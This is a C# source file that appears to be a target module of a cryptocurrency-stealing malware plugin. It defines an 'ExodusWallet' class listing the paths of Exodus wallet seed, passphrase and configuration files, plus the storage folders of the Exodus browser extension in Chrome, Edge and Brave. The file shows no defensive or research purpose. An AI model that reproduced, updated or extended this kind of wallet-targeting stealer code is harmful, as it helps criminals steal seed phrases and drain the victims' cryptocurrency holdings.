using System;
using System.Collections.Generic;
using System.IO;

namespace Plugin.Crypto
{
    public class ExodusWallet : CryptoWalletBase
    {
        public ExodusWallet()
        {
            walletName = "Exodus";
            
            // Updated Exodus wallet paths (v22+ changed structure in 2023)
            // Desktop app paths
            walletPaths.Add("%APPDATA%\\Exodus\\exodus.wallet");
            walletPaths.Add("%APPDATA%\\Exodus\\seed.seco");
            walletPaths.Add("%APPDATA%\\Exodus\\passphrase.json");
            walletPaths.Add("%APPDATA%\\Exodus\\exodus.conf.json");
            
            // Browser extension paths (added in 2022)
            // Extension ID: aholpfdialjgjfhomihkjbmgjidlcdno
            walletPaths.Add("%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\aholpfdialjgjfhomihkjbmgjidlcdno");
            walletPaths.Add("%LOCALAPPDATA%\\Microsoft\\Edge\\User Data\\Default\\Local Extension Settings\\aholpfdialjgjfhomihkjbmgjidlcdno");
            walletPaths.Add("%LOCALAPPDATA%\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Extension Settings\\aholpfdialjgjfhomihkjbmgjidlcdno");
        }
    }
}
